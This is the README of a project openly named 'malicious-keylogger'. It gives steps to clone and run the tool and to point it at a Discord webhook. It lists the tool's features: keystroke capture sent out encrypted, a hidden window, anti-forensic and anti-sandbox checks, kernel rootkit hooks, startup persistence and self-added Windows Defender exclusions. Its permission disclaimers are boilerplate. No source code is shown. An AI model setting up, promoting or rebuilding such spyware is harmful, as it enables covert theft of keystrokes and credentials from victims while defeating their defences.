Usage:
- Warning: Do not use this script for any illegal activities. Unauthorized use of this software may violate local, state, national, or international laws.
- Clone the repository: `git clone https://github.com/urbancheese/malicious-keylogger.git`
- Configure settings in the script, including the Discord webhook URL and encryption password.
- Run the script: `python malicious_keylogger.py`
- Monitor the specified Discord channel for captured keystrokes.

Features:
- Keylogging: Captures keystrokes and sends encrypted data to a specified Discord webhook.
- Encryption/Decryption: Uses AES encryption to encrypt and decrypt sensitive data.
- Process Hiding: Hides the process window to avoid detection.
- Anti-Forensic Techniques: Attempts to evade detection and removal by anti-virus and forensic tools.
- Rootkit Functionality: Implements hooks into the Windows kernel to hide malicious activity.
- Anti-Sandbox: The `is_sandboxed()` function is designed to detect whether the script is running in a sandboxed or virtualized environment. It performs a series of checks on system properties, environment variables, and file paths commonly associated with sandbox environments.
- Start-up: To seamlessly integrate this program into system startup, enabling it to initiate alongside the system boot process.
- Exclusions: This program automatically adds itself to windows defender exclusions afetr running. This prevents the malware from being detected.

Security Considerations:
- Ensure that you have explicit permission from the target before running this script on any system.
- Protect sensitive data, including encryption passwords and Discord webhook URLs.
- Use this script responsibly and ethically, and never engage in any illegal activities.

License:
- This project is licensed under urbancheese - see the LICENSE file for details.

Contact:
- For questions or concerns, please contact urbancheese at urbancheese604@gmail.com.
